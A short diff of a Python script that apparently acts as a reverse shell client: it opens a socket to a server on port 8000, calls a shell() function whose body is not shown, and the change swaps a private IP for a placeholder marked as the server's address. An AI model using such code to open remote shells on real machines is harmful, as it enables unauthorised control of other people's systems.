@@ -38,7 +38,7 @@ def shell():
 
 
 sock = socket.socket()
-sock.connect(("192.168.1.67", 8000))
+sock.connect(("XXX.XX.XX.XX", 8000))  # SERVER'S IP
 print("Connection established to server")
 shell()
 sock.close()
